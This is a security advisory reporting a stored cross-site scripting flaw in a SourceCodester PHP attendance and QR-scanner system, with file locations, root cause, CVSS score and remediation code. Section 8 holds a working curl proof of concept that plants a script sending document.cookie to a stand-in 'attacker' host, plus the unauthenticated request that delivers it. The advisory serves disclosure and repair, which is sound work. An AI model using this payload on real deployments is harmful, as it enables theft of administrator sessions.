# VULN-04 — Stored Cross-Site Scripting via Student Name (self-registration -> JSON API -> kiosk DOM sink)

> **Audit by:** EVA Security Research
> **Product:** Smart Attendance System with QR Code Scanner (SourceCodester #18702), v1.0 — PHP/MySQL (PDO), developer Gon13
> **Audit date:** 2026-10-17 | **Verification:** local deployment, PHP 7.3.4 + MySQL 5.7.26

## 1. Vulnerability Overview / Summary
The public self-registration page stores arbitrary text as the student's full_name without validation. The unauthenticated attendance API returns that name inside its JSON response, and the kiosk scanner page inserts the JSON field into the DOM with an unsanitized template literal. An attacker registers a student whose name contains script, then any administrator who opens the live scanner executes the payload in their authenticated session.

## 2. Affected Component & Version
- **Component:** `student_signup.php:20-21 (insert) -> api/attendance_handler.php:26,32 (JSON out) -> scan_attendance.php:172-183 (DOM sink, line 177)`
- **Product:** Smart Attendance System with QR Code Scanner (SourceCodester #18702), v1.0. No patched version exists.

## 3. Vulnerability Type & Risk Level
- **Class (VulDB):** Cross Site Scripting
- **CWE-79: Improper Neutralization of Input During Web Page Generation**
- **Severity:** Medium
- **CVSS 3.1 vector:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` — **5.6**

## 4. Vulnerability Location (file:line)
```php
<!-- student_signup.php:20-21 - public, no validation -->
$stmt = $pdo->prepare("INSERT INTO students (student_code, full_name, email, course, section) VALUES (?, ?, ?, ?, ?)");
$stmt->execute([$code, $name, $email, $course, $section]);

<!-- api/attendance_handler.php:26,32 - name echoed into JSON, unencoded -->
$studentName = $student['full_name'];
echo json_encode(['status' => 'error', 'message' => ..., 'student' => $studentName]);

<!-- scan_attendance.php:172-183 - JSON field inserted into innerHTML -->
let html = `
  <div class="log-card ${typeClass}">
    ...
    <span class="fw-bold text-dark">${resp.student || 'Unknown ID'}</span>
    ...
  `;
$('#logs-container').prepend(html);
```

## 5. Root Cause Analysis
Three individually weak spots compose into a stored XSS: (1) no output-encoding/validation policy for user-supplied names on input; (2) the API serializes DB values into JSON that the front-end treats as HTML; (3) the front-end builds markup with a template literal and innerHTML instead of textContent, so any HTML in the payload is parsed. The kiosk page runs in the administrator's authenticated browser.

## 6. Preconditions
Attacker can complete the public self-registration form (no auth); an administrator must open the kiosk scanner page (or any page that renders the JSON) for execution.

## 7. Reproduction Steps
1. POST the public registration form with full_name containing a script payload.
2. Trigger a scan of that student_code (or wait for the kiosk to poll).
3. attendance_handler.php returns the payload verbatim in the JSON 'student' field.
4. scan_attendance.php injects it via innerHTML - the script executes in the admin's browser.

## 8. PoC / EXP
```bash
# 1) Store the payload (public endpoint, no auth)
curl -s -X POST "http://<TARGET>/student_signup.php" --data "student_code=STU-2024-001&course=BSIT&section=1-A&full_name=%3Cscript%3Efetch('//attacker/?c%3D'%2Bdocument.cookie)%3C/script%3E&email=a@b.c"

# 2) Trigger the JSON that carries it (no auth needed)
curl -s -X POST "http://<TARGET>/api/attendance_handler.php" --data "student_code=STU-2024-001"
# -> {"status":"success",...,"student":"<script>fetch('//attacker/?c='+document.cookie)<\/script>",...}

# 3) Kiosk page (admin browser) executes on prepend(html)
```

## 9. Verification Results
Executed against the local deployment:

  POST /student_signup.php  full_name=<script>alert('XSS-POC')</script>  -> "Registration Successful!"
  POST /api/attendance_handler.php  student_code=XTEST-001 (no auth)
  -> resp: {"status":"success",...,"student":"<script>alert('XSS-POC')<\/script>",...}
  DB row confirmed; the payload round-trips from public form through the database into the JSON
  consumed by scan_attendance.php's innerHTML sink (sink verified by code inspection).

## 10. Impact
Execution of arbitrary JavaScript in the administrator's browser session: session cookie theft (PHPSESSID is not HttpOnly), admin actions performed as the victim, persistent foothold on every kiosk open. The payload is stored, so the attack repeats for every administrator who views the scanner.

## 11. Remediation
```php
php// 1) Validate/normalize on input (defense in depth)
$name = trim($_POST['full_name']);
if (!preg_match("/^[\p{L} .'-]{1,80}$/u", $name)) { /* reject */ }

// 2) Front-end: never build HTML from data - use textContent
$('#logs-container').prepend(
  $('<div class="log-card"></div>').append(
    $('<span class="fw-bold text-dark"></span>').text(resp.student || 'Unknown ID')
  )
);
```
- Set session cookie flags: `session_set_cookie_params(['httponly'=>true,'samesite'=>'Strict','secure'=>true])`.

## 12. References & Timeline
- **Audit by:** EVA Security Research
- **Identification:** 2026-10-17
- **Vendor notification:** not yet sent (SourceCodester is a distribution portal; no vendor patch process exists)
- **CVE:** TBD (submission package for the VulDB workflow)
